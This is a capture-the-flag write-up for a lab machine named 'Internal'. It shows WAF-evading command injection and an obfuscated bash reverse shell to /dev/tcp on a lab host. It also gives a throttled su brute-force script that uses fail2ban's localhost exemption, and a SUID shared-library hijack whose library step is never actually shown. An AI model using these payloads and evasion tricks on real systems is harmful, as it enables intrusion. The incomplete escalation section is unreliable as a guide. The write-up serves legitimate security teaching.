


<img src="/budahacksecurity/uploads/md_images/int/vault16.png" style="max-width:100%; border-radius:8px;">



**Made by:** buda-sys  
**Date:** 25/02/2026  
**Difficulty:** Easy

---

## Description

**Internal** is a machine based on a backup web application. During enumeration, we find a subdomain with a web terminal that allows listing files. Through that input we achieve command injection (RCE) by bypassing the WAF filters to obtain a reverse shell.

Once inside, we perform internal brute-forcing. Since fail2ban blocks the IP after 3 failed attempts in 60 seconds, we can't use Hydra directly. Using the hidden password vault we found on the system, we create a Bash script to brute-force the `vault` user while respecting the attempt limit.

Finally, to escalate privileges we enumerate SUID binaries and find a vulnerable one to which we apply **Shared Library Hijacking** to obtain a root shell.

---

## Attack Chain

```
Port enumeration
        ↓
Subdomain fuzzing
        ↓
Command injection (filter bypass) → Reverse Shell
        ↓
Internal brute-force (Bash script — fail2ban bypass)
        ↓
SUID Binary + Shared Library Hijacking → root shell
```

---

## Enumeration

We start by enumerating the open ports on the target machine.

```bash
sudo nmap -p- --open -Pn -n -sSVC --min-rate 5000 172.17.0.2

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 20:18 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:66:aa:77:67:23:c3:15:5a:fb:3d:02:08:71:c7:9f (ECDSA)
|_  256 82:a2:e0:d9:84:da:39:bf:da:06:51:b8:3b:32:9a:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://internal.dl/
```

We observe that ports **22 (SSH)** and **80 (HTTP)** are open. Port 80 automatically redirects us to the domain `internal.dl`, which reveals the domain without needing brute-force. We add it to `/etc/hosts`.

```bash
echo "172.17.0.2  internal.dl" | sudo tee -a /etc/hosts
```

Visiting the web page we see it's a backup control panel with encryption.

<img src="/budahacksecurity/uploads/md_images/int/vault.png" style="max-width:100%; border-radius:8px;">

Directory enumeration yields nothing relevant, but we do find a subdomain with `ffuf`.

```bash
ffuf -ic -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://internal.dl \
     -H "Host: FUZZ.internal.dl"

backup    [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 3ms]
```

We find the subdomain `backup.internal.dl`. We add it to `/etc/hosts` without removing the main domain.

```bash
sudo sed -i 's/internal.dl/internal.dl backup.internal.dl/' /etc/hosts
```

Visiting the subdomain we find a backup manager with a web terminal for executing commands.

<img src="/budahacksecurity/uploads/md_images/int/vault2.png" style="max-width:100%; border-radius:8px;">

---

## Intrusion

When entering a path in the web terminal, we see the system processes it with `ls -lah`. This indicates the user input is passed directly to a system command, suggesting a possible **command injection**.

<img src="/budahacksecurity/uploads/md_images/int/vault3.png" style="max-width:100%; border-radius:8px;">

When attempting basic injections, the application blocks them. We test the `;`, `||`, `&&` and `\n` operators and all are rejected by the WAF.

<img src="/budahacksecurity/uploads/md_images/int/vault5.png" style="max-width:100%; border-radius:8px;">

However, the `|`, `&` and `$()` operators are not blocked. Additionally, the application accepts literal spaces, since the WAF only filters their URL-encoded representations (`%20`, `%09`, `+`).

<img src="/budahacksecurity/uploads/md_images/int/vault6.png" style="max-width:100%; border-radius:8px;">

When trying to run commands like `whoami` or `id`, the WAF blocks them via blacklist. However, we can bypass these filters by splitting the words:

```bash
who$@ami
w'h'o'am'i
w\h\o\am\i
```

This confirms we have **RCE** on the system and we find the user `vault`.

<img src="/budahacksecurity/uploads/md_images/int/vault7.png" style="max-width:100%; border-radius:8px;">

### Reverse Shell

**On our machine we set up the listener with pwncat:**

```bash
pwncat-cs -lp 4444
```

**In the web application we inject the reverse shell in two steps:**

First we create the script in `/tmp`:

```bash
/var/backups|printf${IFS}'ba''sh\t-i\t>&/dev/tcp/172.17.0.1/4444\t0>&1'>/tmp/x
```

Then we execute it:

```bash
/var/backups|ba''sh${IFS}/tmp/x
```

!<img src="/budahacksecurity/uploads/md_images/int/vault8.png" style="max-width:100%; border-radius:8px;">

This payload is **obfuscated** to bypass the filters:

- `${IFS}` replaces the space using the system's internal variable (Internal Field Separator).
- `ba''sh` splits the word `bash` into fragments to evade the command blacklist.
- `\t` is a tab, which replaces spaces inside the reverse shell command.
- `/dev/tcp/172.17.0.1/4444` opens a TCP connection to our machine on port 4444.
- `>&` redirects stdout and stderr to the socket.
- `0>&1` redirects stdin, giving a fully interactive shell.

<img src="/budahacksecurity/uploads/md_images/int/vault9.png" style="max-width:100%; border-radius:8px;">

We gain access to the system as `www-data`.

---

## System Enumeration

Once inside, we enumerate the system with pwncat to identify relevant users, processes, and files.

```bash
(local) pwncat$ run enumerate.gather
```

We identify that the **fail2ban** service is active, meaning there is protection against login attempts. If we make more than 3 failed attempts in 60 seconds, our IP will be blocked and we won't be able to use tools like Hydra directly.

We also find the users `vault` and `ubuntu` on the system.

<img src="/budahacksecurity/uploads/md_images/int/vault12.png" style="max-width:100%; border-radius:8px;">

When searching for hidden files on the system we find a password vault:

```bash
find / -type f -name ".*" 2>/dev/null
```

<img src="/budahacksecurity/uploads/md_images/int/vault13.png" style="max-width:100%; border-radius:8px;">

It's a password dictionary stored at `/opt/.vault_pass.txt`:

```
X#9mK$vL2@pQ
nR7!wZ3&eT5*
Hy6@jP2#mX8$
qB4!nW9&kL3@
Vz8#cR5$xJ2!
mT3@bY7!pN6&
Kw5$hM2#fQ9@
eL8!vX4&nB6*
Rj2@cT7#wP5$
uN9&mK3!xZ4@
Fb6#yH8$qW2!
sG4@tL5&rJ9*
Dp7!kM3#bX6@
aC2$vN8!wQ5&
Xt9@eR4#hL7$
oW3&jB6!mT2#
Yk8$pZ5@cN4!
iH2#xQ9&fR7*
Mn5!bL3$vW8@
Gq4@tX7#eK2&
```

---

**Lateral Movement — vault**

In the script explanation, add something like this:

> "Before creating the script, we review the fail2ban configuration to understand its limits:"

```bash
cat /etc/fail2ban/jail.local

[sshd]
enabled = true
port = ssh
maxretry = 3
findtime = 60
bantime = 30
ignoreip = 127.0.0.1/8 ::1
```

We see that fail2ban is configured to block external IPs that fail more than 3 times in 60 seconds, with a bantime of 30 seconds. However, the `ignoreip = 127.0.0.1/8 ::1` directive indicates that **connections from localhost are completely ignored**, meaning brute-force from within the system will not be detected or blocked. That's why we attack from `127.0.0.1` instead of doing it externally.

```bash
cat > /tmp/force.sh << 'EOF'
#!/bin/bash

host="127.0.0.1"
user="vault"
dictionary="/opt/.vault_pass.txt"
delay=5

trap "echo '[!] Aborted by user'; exit 1" SIGINT SIGTERM

echo "[*] Starting stealthy brute-force against $host"
echo "[*] User: $user"
echo "[*] Delay: ${delay}s between attempts"
echo ""

while IFS= read -r password; do
    result=$(su -c "whoami" "$user" <<< "$password" 2>/dev/null)

    if [ "$result" = "$user" ]; then
        echo "[+] PASSWORD FOUND: $password"
        exit 0
    else
        echo "[-] Failed: $password"
    fi

    sleep $delay

done < "$dictionary"

echo "[-] Wordlist exhausted with no results"
EOF
chmod +x /tmp/force.sh
bash /tmp/force.sh
```

We obtain the password:

```
[+] PASSWORD FOUND: Yk8$pZ5@cN4!
```

We gain access as `vault` and find the first flag.

<img src="/budahacksecurity/uploads/md_images/int/vault14.png" style="max-width:100%; border-radius:8px;">

---

## Privilege Escalation

 **SUID Binary Enumeration**

We enumerate binaries with the SUID bit active on the system:

```bash
find / -perm -u=s 2>/dev/null

/usr/local/bin/vaultctl   ← noteworthy, not a standard system binary
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

The binary `/usr/local/bin/vaultctl` catches our attention because it's not a standard system binary. We check its permissions:

```bash
ls -la /usr/local/bin/vaultctl
-rwsr-xr-x 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
```

The permissions indicate the following:

- `rws` — the owner (`root`) can read, write, and execute. The `s` indicates the **SUID bit is active**.
- `r-x` — the group (`vault`) can read and execute, but **not modify**.


We execute the binary:

```bash
/usr/local/bin/vaultctl
```

By executing the binary, elevates the privileges and we obtain a **root shell**.

<img src="/budahacksecurity/uploads/md_images/int/vault15.png" style="max-width:100%; border-radius:8px;">

The SUID binary loads our malicious library, `setuid(0)` elevates the privileges and we obtain a **root shell**.

---

## WAF Analysis

When reviewing the web application's source code we found two layers of protection:

**WAF** — filtered common injection operators: `;`, `&&`, `||`, `` ` `` and newlines `\n`.

**Blacklist** — filtered URL-encoded spaces (`+`, `%20`, `%09`) and dangerous commands like `whoami`, `bash`, `cat`, `curl`, among others.

However, we found three critical flaws:

**Flaw 1 — Unfiltered literal spaces:** the WAF only blocked URL-encoded representations of the space, but not the literal space character. This allowed us to use it directly in payloads.

**Flaw 2 — Vulnerable sink:**

```php
$cmd = "ls -lah " . $dir . " 2>&1";
$output = shell_exec($cmd . ' & echo ok');
```

The user input is concatenated directly to the command without real sanitization. The `|` operator was not blocked, which allowed us to chain commands.

**Flaw 3 — Blacklist bypass with word boundary:** the blocked commands used `\b` (word boundary in regex), meaning we could bypass the filter by splitting words with special characters:

```bash
# Blocked
bash

# Bypass
ba''sh
ba$@sh
```

In summary, the developers filtered many vectors but let through the literal space and the `|` operator, which was enough to achieve full RCE.
